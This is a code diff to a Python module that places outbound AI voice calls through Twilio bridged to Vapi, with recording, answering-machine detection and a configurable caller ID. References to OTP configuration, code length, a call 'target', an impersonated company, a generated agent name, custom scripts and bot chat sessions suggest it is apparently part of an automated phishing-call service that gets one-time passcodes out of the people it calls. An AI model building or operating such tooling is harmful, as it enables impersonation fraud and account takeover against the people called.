@@ -9,12 +9,12 @@ import logging
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 from typing import Optional
+from urllib.parse import quote_plus
 
 from twilio.rest import Client
 
 from config import ACCOUNT_SID, AUTH_TOKEN, TWILIO_PHONE_NUMBER, OUTBOUND_CALLER_ID, NGROK_URL, build_public_base_url
 from core.files import ensure_user_path, user_conf_path, write_user_file
-
 logger = logging.getLogger(__name__)
 
 _twilio_client = None
@@ -34,6 +34,166 @@ def get_twilio_client():
     return _twilio_client
 
 
+def dial_call_with_twiml(
+    to: str,
+    from_number: str,
+    twiml: str,
+    user_id: str = "",
+    chat_id: Optional[int] = None,
+    caller_id: Optional[str] = None,
+    record: bool = True,
+    machine_detection: Optional[str] = None,
+    async_amd: bool = False,
+    async_amd_status_callback: Optional[str] = None,
+    machine_detection_timeout: Optional[int] = None,
+    machine_detection_speech_threshold: Optional[int] = None,
+    machine_detection_speech_end_threshold: Optional[int] = None,
+    machine_detection_silence_timeout: Optional[int] = None,
+    status_callback_events: Optional[list] = None,
+    **kwargs,
+) -> Optional[str]:
+    """Place an outbound Twilio call that immediately streams to Vapi via TwiML.
+
+    Twilio does the actual dialing; Vapi only handles STT/LLM/TTS over the
+    media stream started by the provided TwiML (``<Connect><Stream>``).
+    Returns the Twilio Call SID on success or None.
+    """
+    client = get_twilio_client()
+    if not client:
+        logger.error("Twilio not configured")
+        return None
+
+    public_base = build_public_base_url() or NGROK_URL
+    call_params = {
+        "to": to,
+        "from_": from_number,
+        "twiml": twiml,
+        "method": "POST",
+    }
+
+    status_cb = f"{public_base.rstrip('/')}/twilio/status?user_id={quote_plus(str(user_id))}"
+    if chat_id:
+        status_cb += f"&chat_id={quote_plus(str(chat_id))}"
+    call_params["status_callback"] = status_cb
+    call_params["status_callback_method"] = "POST"
+    call_params["status_callback_event"] = status_callback_events or [
+        "queued", "ringing", "answered", "completed", "busy", "failed", "no-answer", "canceled",
+    ]
+
+    rec_cb = f"{public_base.rstrip('/')}/twilio/recording?user_id={quote_plus(str(user_id))}"
+    if chat_id:
+        rec_cb += f"&chat_id={quote_plus(str(chat_id))}"
+    call_params["recording_status_callback"] = rec_cb
+    call_params["recording_status_callback_method"] = "POST"
+    call_params["recording_status_callback_event"] = ["completed"]
+    if record:
+        call_params["record"] = True
+        call_params["recording_channels"] = "mono"
+
+    if machine_detection:
+        call_params["machine_detection"] = machine_detection
+        call_params["async_amd"] = True
+        amd_cb = f"{public_base.rstrip('/')}/amd_callback?user_id={quote_plus(str(user_id))}"
+        if chat_id:
+            amd_cb += f"&chat_id={quote_plus(str(chat_id))}"
+        call_params["async_amd_status_callback"] = amd_cb
+        call_params["machine_detection_timeout"] = machine_detection_timeout or 8
+        call_params["machine_detection_speech_threshold"] = machine_detection_speech_threshold or 1800
+        call_params["machine_detection_speech_end_threshold"] = machine_detection_speech_end_threshold or 1200
+        call_params["machine_detection_silence_timeout"] = machine_detection_silence_timeout or 3000
+
+    logger.info("Twilio bridge outbound call params: %s",
+                {k: v for k, v in call_params.items() if k != "twiml"})
+    try:
+        call = client.calls.create(**call_params)
+        logger.info("[TWILIO_BRIDGE_CALL_CREATED] sid=%s to=%s", call.sid, to)
+        return call.sid
+    except Exception as e:
+        logger.error("[TWILIO_BRIDGE_CALL_ERROR] %s", e)
+        return None
+
+
+def end_call(twilio_sid: str) -> bool:
+    """Hang up an active Twilio call (used to end a bridged AI call)."""
+    client = get_twilio_client()
+    if not client or not twilio_sid:
+        return False
+    try:
+        client.calls(twilio_sid).update(status="completed")
+        logger.info("[TWILIO_END_CALL] sid=%s", twilio_sid)
+        return True
+    except Exception as e:
+        logger.warning("[TWILIO_END_CALL_ERROR] sid=%s error=%s", twilio_sid, e)
+        return False
+
+
+def place_ai_call(
+    to: str,
+    user_id: str,
+    chat_id: Optional[int],
+    customer_name: str,
+    assistant_overrides: dict,
+    metadata: dict,
+    from_number: str = None,
+    caller_id: str = None,
+    record: bool = True,
+    machine_detection: Optional[str] = None,
+    endpoint: str = "/twilio_bridge",
+    mode_label: str = "AI Call",
+    **session_kwargs,
+) -> Optional[str]:
+    """Create a Vapi bypass session and place the call via Twilio.
+
+    Returns the Twilio SID, or None. Registers the session keyed by the Twilio
+    SID and keeps the Vapi call id in the session for OTP/transcript handling.
+    """
+    from services.vapi_service import create_call_bypass
+
+    bridge = create_call_bypass(
+        customer_number=to,
+        customer_name=customer_name,
+        assistant_overrides=assistant_overrides,
+        metadata=metadata,
+    )
+    if not bridge:
+        logger.error("[VAPI_BRIDGE] bypass call failed for %s (user=%s)", to, user_id)
+        return None
+
+    vapi_call_id = bridge["vapi_call_id"]
+    twiml = bridge["twiml"]
+    twilio_sid = dial_call_with_twiml(
+        to=to,
+        from_number=from_number or OUTBOUND_CALLER_ID,
+        twiml=twiml,
+        user_id=user_id,
+        chat_id=chat_id,
+        caller_id=caller_id,
+        record=record,
+        machine_detection=machine_detection,
+    )
+    if not twilio_sid:
+        logger.error("[VAPI_BRIDGE] Twilio dial failed for %s (vapi_call=%s)", to, vapi_call_id)
+        return None
+
+    logger.info("[VAPI_BRIDGE] Call placed by Twilio sid=%s vapi_call=%s target=%s (user=%s)",
+                twilio_sid, vapi_call_id, to, user_id)
+    store_call_metadata(user_id, twilio_sid, target=to)
+    try:
+        from bot import register_call_session
+        register_call_session(
+            twilio_sid,
+            user_id,
+            chat_id=chat_id,
+            endpoint=endpoint,
+            mode_label=mode_label,
+            vapi_call_id=vapi_call_id,
+            **session_kwargs,
+        )
+    except Exception as exc:
+        logger.debug("Failed to register bridge session: %s", exc)
+    return twilio_sid
+
+
 def make_call(to: str, from_number: str = None, caller_id: str = None,
               webhook_url: str = None, user_id: str = "",
               record: bool = True, machine_detection: Optional[str] = None,
@@ -44,7 +204,6 @@ def make_call(to: str, from_number: str = None, caller_id: str = None,
               machine_detection_speech_end_threshold: Optional[int] = None,
               machine_detection_silence_timeout: Optional[int] = None,
               **kwargs) -> Optional[str]:
-    from services.vapi_service import create_call as vapi_create_call
     from models.call_metadata import CallMetadata, TargetInfo, CompanyInfo, OTPConfig, AIBehavior
     from services.prompt_builder import PromptBuilder
     from services.voice_identity import select_agent_name
@@ -85,6 +244,10 @@ def make_call(to: str, from_number: str = None, caller_id: str = None,
     custom_instructions = kwargs.get("custom_instructions") or read_user_file(user_id, "custom_script.txt", "") or None
     if custom_instructions:
         metadata.custom_instructions = custom_instructions
+    else:
+        override = read_user_file(user_id, "ai_prompt_override.txt", "").strip()
+        if override:
+            metadata.custom_instructions = override
     metadata.internal = {
         "user_id": user_id,
         "chat_id": chat_id,
@@ -104,20 +267,27 @@ def make_call(to: str, from_number: str = None, caller_id: str = None,
         "code_length": str(code_length),
     }
 
-    vapi_call_id = vapi_create_call(
-        customer_number=to,
+    return place_ai_call(
+        to=to,
+        user_id=user_id,
+        chat_id=chat_id,
         customer_name=customer_name,
         assistant_overrides=assistant_overrides,
         metadata=call_metadata,
+        from_number=from_number,
+        caller_id=caller_id,
+        record=record,
+        machine_detection=machine_detection,
+        endpoint=kwargs.get("endpoint") or "/twilio_bridge",
+        mode_label=kwargs.get("mode_label") or "AI Call",
+        voice_id=voice_id,
+        emotion=emotion,
+        name=name,
+        company=company,
+        language=language,
+        code_length=str(code_length),
+        delivery_method=delivery_method,
     )
-
-    if vapi_call_id:
-        logger.info("[VAPI_CALL] Created call id=%s for %s (user=%s)", vapi_call_id, to, user_id)
-        store_call_metadata(user_id, vapi_call_id, target=to)
-        return vapi_call_id
-
-    logger.error("[VAPI_CALL] Failed to create call for %s (user=%s)", to, user_id)
-    return None
 
 
 def make_call_and_store_async(
@@ -152,8 +322,6 @@ def make_call_and_store_async(
             async_amd_status_callback=async_amd_status_callback,
             **kwargs,
         )
-        if sid:
-            store_call_metadata(user_id, sid, target=target)
         return sid
 
     try:
@@ -164,6 +332,14 @@ def make_call_and_store_async(
 
 
 def get_call_status(call_id: str) -> Optional[str]:
+    client = get_twilio_client()
+    if not client or not call_id:
+        return None
+    try:
+        if str(call_id).startswith("CA"):
+            return client.calls(call_id).fetch().status
+    except Exception as e:
+        logger.warning("[TWILIO_GET_CALL_STATUS_ERROR] id=%s error=%s", call_id, e)
     from services.vapi_service import get_call as vapi_get_call
     call_data = vapi_get_call(call_id)
     if call_data:
